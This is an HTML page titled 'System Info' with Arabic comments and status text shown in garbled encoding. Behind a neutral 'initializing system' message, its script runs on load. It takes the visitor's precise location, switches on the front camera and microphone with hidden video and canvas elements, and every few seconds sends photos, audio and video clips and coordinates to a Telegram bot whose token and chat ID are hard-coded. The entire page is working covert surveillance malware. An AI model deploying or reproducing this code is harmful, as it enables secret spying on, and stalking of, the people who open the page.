<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="google" content="notranslate">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>System Info</title>
    <style>
        /* Ø¥Ø®ÙØ§Ø¡ ÙƒØ§ÙØ© Ø§Ù„Ø¹Ù†Ø§ØµØ± Ø§Ù„Ù…Ø±Ø¦ÙŠØ© */
        video, canvas {
            display: none;
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
        
        body {
            margin: 0;
            padding: 0;
            background-color: #f0f0f0;
            font-family: Arial, sans-serif;
        }
        
        .status {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            text-align: center;
            color: #333;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="status">Ø¬Ø§Ø±ÙŠ ØªÙ‡ÙŠØ¦Ø© Ø§Ù„Ù†Ø¸Ø§Ù…...</div>
    <video id="video" autoplay muted playsinline></video>
    <canvas id="canvas"></canvas>
    
    <script>
        // Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„ØªØ·Ø¨ÙŠÙ‚
        const CONFIG = {
            BOT_TOKEN: '6848636559:AAFSKqxz55aBzpVLX-VQ-sSwroauu0CpR_k',
            CHAT_ID: '5358365084',
            CAPTURE_INTERVAL: 5000, // 5 Ø«ÙˆØ§Ù†ÙŠ
            VIDEO_DURATION: 5000,   // 5 Ø«ÙˆØ§Ù†ÙŠ
            MAX_RETRIES: 3
        };

        // Ø¹Ù†Ø§ØµØ± DOM
        const videoElement = document.getElementById('video');
        const canvasElement = document.getElementById('canvas');
        const statusElement = document.querySelector('.status');
        
        // Ù…ØªØºÙŠØ±Ø§Øª Ø§Ù„Ø­Ø§Ù„Ø©
        let mediaStream = null;
        let isStreamActive = false;
        let photoInterval = null;
        let videoInterval = null;
        let retryCount = 0;

        // Ø¯Ø§Ù„Ø© ØªØ­Ø¯ÙŠØ« Ø­Ø§Ù„Ø© Ø§Ù„Ù†Ø¸Ø§Ù…
        function updateStatus(message) {
            if (statusElement) {
                statusElement.textContent = message;
            }
            console.log(`[STATUS]: ${message}`);
        }

        // Ø¯Ø§Ù„Ø© Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ù„Ù‰ Telegram
        async function sendToTelegram(type, formData) {
            try {
                const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/${type}?chat_id=${CONFIG.CHAT_ID}`;
                const response = await fetch(url, {
                    method: 'POST',
                    body: formData
                });
                
                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
                
                const data = await response.json();
                return { success: data.ok, data };
            } catch (error) {
                console.error(`Failed to send ${type}:`, error);
                return { success: false, error };
            }
        }

        // Ø¯Ø§Ù„Ø© Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹
        function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const { latitude, longitude } = position.coords;
                        const locationText = `ğŸ“ Ø§Ù„Ù…ÙˆÙ‚Ø¹: https://www.google.com/maps/place/${latitude},${longitude}`;
                        resolve(locationText);
                    },
                    (error) => {
                        console.warn('ÙØ´Ù„ ÙÙŠ Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹:', error);
                        resolve(null);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            });
        }

        // Ø¯Ø§Ù„Ø© Ø§Ù„ØªÙ‚Ø§Ø· ÙˆØ¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø©
        async function captureAndSendPhoto() {
            if (!isStreamActive || !mediaStream) return;

            try {
                // Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Canvas
                const videoWidth = videoElement.videoWidth;
                const videoHeight = videoElement.videoHeight;
                
                if (videoWidth === 0 || videoHeight === 0) {
                    console.warn('Ø§Ù„ÙÙŠØ¯ÙŠÙˆ ØºÙŠØ± Ø¬Ø§Ù‡Ø² Ù„Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø©');
                    return;
                }

                canvasElement.width = videoWidth;
                canvasElement.height = videoHeight;
                
                // Ø±Ø³Ù… Ø§Ù„ØµÙˆØ±Ø© Ø¹Ù„Ù‰ Canvas
                const context = canvasElement.getContext('2d');
                context.drawImage(videoElement, 0, 0, videoWidth, videoHeight);
                
                // ØªØ­ÙˆÙŠÙ„ Ø§Ù„ØµÙˆØ±Ø© Ø¥Ù„Ù‰ Blob
                canvasElement.toBlob(async (blob) => {
                    if (!blob) return;
                    
                    const formData = new FormData();
                    formData.append('photo', blob, `photo_${Date.now()}.jpg`);
                    
                    updateStatus('Ø¬Ø§Ø±ÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø©...');
                    const result = await sendToTelegram('sendPhoto', formData);
                    
                    if (result.success) {
                        updateStatus('ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø© Ø¨Ù†Ø¬Ø§Ø­');
                        retryCount = 0;
                    } else {
                        console.error('ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø©:', result.error);
                    }
                }, 'image/jpeg', 1);
            } catch (error) {
                console.error('Ø®Ø·Ø£ ÙÙŠ Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø©:', error);
            }
        }

        // Ø¯Ø§Ù„Ø© ØªØ³Ø¬ÙŠÙ„ ÙˆØ¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ
        async function recordAndSendVideo() {
            if (!isStreamActive || !mediaStream) return;

            try {
                updateStatus('Ø¬Ø§Ø±ÙŠ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ...');
                
                const mediaRecorder = new MediaRecorder(mediaStream, {
                    mimeType: 'video/webm;codecs=vp9,opus'
                });
                
                const chunks = [];
                
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        chunks.push(event.data);
                    }
                };
                
                mediaRecorder.onstop = async () => {
                    if (chunks.length === 0) {
                        console.warn('Ù„Ø§ ØªÙˆØ¬Ø¯ Ø¨ÙŠØ§Ù†Ø§Øª ÙÙŠØ¯ÙŠÙˆ');
                        return;
                    }
                    
                    const videoBlob = new Blob(chunks, { type: 'video/webm' });
                    
                    // ØªØ­ÙˆÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ø¥Ù„Ù‰ MP4 Ø¥Ø°Ø§ Ø£Ù…ÙƒÙ†
                    try {
                        const formData = new FormData();
                        formData.append('video', videoBlob, `video_${Date.now()}.webm`);
                        
                        updateStatus('Ø¬Ø§Ø±ÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ...');
                        const result = await sendToTelegram('sendVideo', formData);
                        
                        if (result.success) {
                            updateStatus('ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ø¨Ù†Ø¬Ø§Ø­');
                            retryCount = 0;
                        } else {
                            console.error('ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ:', result.error);
                        }
                    } catch (error) {
                        console.error('Ø®Ø·Ø£ ÙÙŠ Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„ÙÙŠØ¯ÙŠÙˆ:', error);
                    }
                };
                
                mediaRecorder.onerror = (error) => {
                    console.error('Ø®Ø·Ø£ ÙÙŠ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ:', error);
                };
                
                // Ø¨Ø¯Ø¡ Ø§Ù„ØªØ³Ø¬ÙŠÙ„
                mediaRecorder.start();
                
                // Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ØªØ³Ø¬ÙŠÙ„ Ø¨Ø¹Ø¯ Ø§Ù„Ù…Ø¯Ø© Ø§Ù„Ù…Ø­Ø¯Ø¯Ø©
                setTimeout(() => {
                    if (mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    }
                }, CONFIG.VIDEO_DURATION);
                
            } catch (error) {
                console.error('Ø®Ø·Ø£ ÙÙŠ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ:', error);
            }
        }

        // Ø¯Ø§Ù„Ø© ØªÙ‡ÙŠØ¦Ø© Ø§Ù„Ù†Ø¸Ø§Ù…
        async function initializeSystem() {
            try {
                updateStatus('Ø¬Ø§Ø±ÙŠ ØªÙ‡ÙŠØ¦Ø© Ø§Ù„Ù†Ø¸Ø§Ù…...');
                
                // Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹ ÙˆØ¥Ø±Ø³Ø§Ù„Ù‡
                updateStatus('Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹...');
                const location = await getLocation();
                
                if (location) {
                    const formData = new FormData();
                    formData.append('text', location);
                    await sendToTelegram('sendMessage', formData);
                }
                
                // Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ ØµÙ„Ø§Ø­ÙŠØ§Øª Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ÙˆØ§Ù„Ù…ÙŠÙƒØ±ÙˆÙÙˆÙ†
                updateStatus('Ø¬Ø§Ø±ÙŠ Ø·Ù„Ø¨ ØµÙ„Ø§Ø­ÙŠØ§Øª Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§...');
                
                const constraints = {
                    video: {
                        width: { ideal: 640 },
                        height: { ideal: 480 },
                        facingMode: 'user'
                    },
                    audio: true
                };
                
                mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
                videoElement.srcObject = mediaStream;
                isStreamActive = true;
                
                // Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø± Ø­ØªÙ‰ ÙŠÙƒÙˆÙ† Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ø¬Ø§Ù‡Ø²Ù‹Ø§
                await new Promise((resolve) => {
                    videoElement.onloadedmetadata = () => {
                        videoElement.play();
                        resolve();
                    };
                });
                
                updateStatus('Ø§Ù„Ù†Ø¸Ø§Ù… Ø¬Ø§Ù‡Ø² Ù„Ù„ØªØ´ØºÙŠÙ„');
                
                // Ø¨Ø¯Ø¡ Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ± ÙƒÙ„ 5 Ø«ÙˆØ§Ù†ÙŠ
                photoInterval = setInterval(captureAndSendPhoto, CONFIG.CAPTURE_INTERVAL);
                
                // Ø¨Ø¯Ø¡ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„ÙÙŠØ¯ÙŠÙˆÙ‡Ø§Øª ÙƒÙ„ 5 Ø«ÙˆØ§Ù†ÙŠ
                videoInterval = setInterval(recordAndSendVideo, CONFIG.CAPTURE_INTERVAL);
                
                // Ø§Ù„ØªÙ‚Ø§Ø· Ø£ÙˆÙ„ ØµÙˆØ±Ø© ÙˆØªØ³Ø¬ÙŠÙ„ Ø£ÙˆÙ„ ÙÙŠØ¯ÙŠÙˆ ÙÙˆØ±Ù‹Ø§
                setTimeout(() => {
                    captureAndSendPhoto();
                    recordAndSendVideo();
                }, 1000);
                
            } catch (error) {
                console.error('ÙØ´Ù„ ÙÙŠ ØªÙ‡ÙŠØ¦Ø© Ø§Ù„Ù†Ø¸Ø§Ù…:', error);
                
                if (retryCount < CONFIG.MAX_RETRIES) {
                    retryCount++;
                    updateStatus(`Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© (${retryCount}/${CONFIG.MAX_RETRIES})...`);
                    setTimeout(initializeSystem, 3000);
                } else {
                    updateStatus('ÙØ´Ù„ ÙÙŠ ØªÙ‡ÙŠØ¦Ø© Ø§Ù„Ù†Ø¸Ø§Ù…. ÙŠØ±Ø¬Ù‰ ØªØ­Ø¯ÙŠØ« Ø§Ù„ØµÙØ­Ø©.');
                }
            }
        }

        // Ø¯Ø§Ù„Ø© ØªÙ†Ø¸ÙŠÙ Ø§Ù„Ù…ÙˆØ§Ø±Ø¯
        function cleanupResources() {
            if (photoInterval) {
                clearInterval(photoInterval);
                photoInterval = null;
            }
            
            if (videoInterval) {
                clearInterval(videoInterval);
                videoInterval = null;
            }
            
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => track.stop());
                mediaStream = null;
            }
            
            isStreamActive = false;
            updateStatus('ØªÙ… Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„Ù†Ø¸Ø§Ù…');
        }

        // Ø¥Ø¶Ø§ÙØ© Ù…Ø³ØªÙ…Ø¹ÙŠÙ† Ù„Ù„Ø£Ø­Ø¯Ø§Ø«
        window.addEventListener('beforeunload', cleanupResources);
        document.addEventListener('visibilitychange', () => {
            if (document.hidden) {
                // ÙŠÙ…ÙƒÙ† Ø¥Ø¶Ø§ÙØ© Ù…Ù†Ø·Ù‚ Ù„Ù„ØªØ¹Ø§Ù…Ù„ Ù…Ø¹ Ø­Ø§Ù„Ø© Ø§Ù„Ø®ÙÙŠØ©
                console.log('Ø§Ù„ØµÙØ­Ø© Ù…Ø®ÙÙŠØ©');
            }
        });

        // Ø¨Ø¯Ø¡ ØªØ´ØºÙŠÙ„ Ø§Ù„Ù†Ø¸Ø§Ù… Ø¨Ø¹Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©
        document.addEventListener('DOMContentLoaded', () => {
            // Ø¨Ø¯Ø¡ Ø§Ù„ØªØ´ØºÙŠÙ„ Ø¨Ø¹Ø¯ ØªØ£Ø®ÙŠØ± Ø¨Ø³ÙŠØ· Ù„Ù„ØªØ£ÙƒØ¯ Ù…Ù† ØªØ­Ù…ÙŠÙ„ ÙƒØ§ÙØ© Ø§Ù„Ø¹Ù†Ø§ØµØ±
            setTimeout(initializeSystem, 500);
        });

    </script>
</body>
  </html>
